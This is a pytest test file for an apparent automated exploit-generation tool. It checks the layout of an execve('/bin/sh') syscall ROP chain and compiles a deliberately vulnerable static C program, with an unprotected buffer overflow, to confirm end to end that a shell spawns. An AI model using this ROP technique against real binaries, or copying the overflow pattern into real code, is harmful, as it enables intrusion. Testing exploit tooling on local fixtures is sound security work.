"""Direct execve("/bin/sh",0,0) syscall ROP: for a binary that imports no `system` but supplies
pop rdi/rsi/rdx + pop rax + a syscall gadget and a "/bin/sh" string (static / CTF binaries)."""
import struct
import subprocess

import pytest

from lykos.analyze.poc import rop


def test_build_execve_syscall_structure():
    p = rop.build_execve_syscall(40, binsh=0x4B00D0, syscall=0x40184D, pop_rdi=0x401845,
                                 pop_rsi=0x401847, pop_rdx=0x401849, pop_rax=0x40184B)
    q = lambda o: struct.unpack_from("<Q", p, o)[0]      # noqa: E731
    assert q(40) == 0x401845 and q(48) == 0x4B00D0       # pop rdi ; &"/bin/sh"
    assert q(56) == 0x401847 and q(64) == 0                # pop rsi ; 0
    assert q(72) == 0x401849 and q(80) == 0                # pop rdx ; 0
    assert q(88) == 0x40184B and q(96) == 59               # pop rax ; 59 (execve)
    assert q(104) == 0x40184D                              # syscall


@pytest.fixture
def pool(store):
    from lykos.analyze import register
    from lykos.jobs import JobConfig, WorkerPool
    register()
    p = WorkerPool(store.db_path, store.content, JobConfig(workers=2, poll_interval=0.02))
    p.start()
    try:
        yield p
    finally:
        p.stop(grace=3.0)


@pytest.fixture
def execve_bin(tmp_path_factory):
    from lykos.analyze.dynamic import sandbox
    import shutil
    if sandbox.host_arch() != "x86-64":
        pytest.skip("x86-64 native only")
    gcc = shutil.which("gcc") or shutil.which("cc")
    if not gcc:
        pytest.skip("no C compiler")
    d = tmp_path_factory.mktemp("execve")
    (d / "v.c").write_text(
        '#include <unistd.h>\n'
        'char binsh[] = "/bin/sh";\n'
        '__asm__(".text\\n"\n'
        '  ".global grdi\\n grdi: pop %rdi\\n ret\\n"\n'
        '  ".global grsi\\n grsi: pop %rsi\\n ret\\n"\n'
        '  ".global grdx\\n grdx: pop %rdx\\n ret\\n"\n'
        '  ".global grax\\n grax: pop %rax\\n ret\\n"\n'
        '  ".global gsys\\n gsys: syscall\\n ret\\n");\n'
        'void vuln(){ char b[32]; read(0,b,400); }\n'
        'int main(){ vuln(); return 0; }\n')
    exe = d / "v"
    if subprocess.run([gcc, "-no-pie", "-fno-stack-protector", "-static", "-w",
                       str(d / "v.c"), "-o", str(exe)], capture_output=True).returncode:
        pytest.skip("cannot build execve fixture")
    return exe


def test_exploit_stage_files_l3_execve_rop(store, case, pool, execve_bin):
    """End-to-end: a static no-PIE binary with pop gadgets + syscall + "/bin/sh" (no system) is
    driven to a CONFIRMED L3 execve syscall ROP -- a shell spawns and echoes our marker."""
    from lykos.analyze.ingest import enqueue_triage, ingest
    from lykos.analyze.poc import enqueue_exploit
    from lykos.db.dao import PocDAO, TargetDAO
    from lykos.jobs import JobQueue
    t = ingest(store, case.id, execve_bin, filename="v")
    q = JobQueue(store.conn)
    enqueue_triage(q, t, force=True)
    assert pool.wait_idle(30)
    TargetDAO(store.conn).update_triage(t.id, arch="x86-64", bits=64, endianness="little",
                                        linking="static", stripped=False,
                                        mitigations={"pie": "off"}, file_type="elf")
    run = enqueue_exploit(q, t, params={"strategy": "execve", "offset": 40})
    assert pool.wait_idle(60) and q.runs.get(run.id).status == "done"
    pocs = PocDAO(store.conn).list_by_target(t.id)
    assert any(pc.level == "L3" and pc.verified for pc in pocs), \
        f"no confirmed L3 execve ROP (pocs={[(p.level, p.verified) for p in pocs]})"
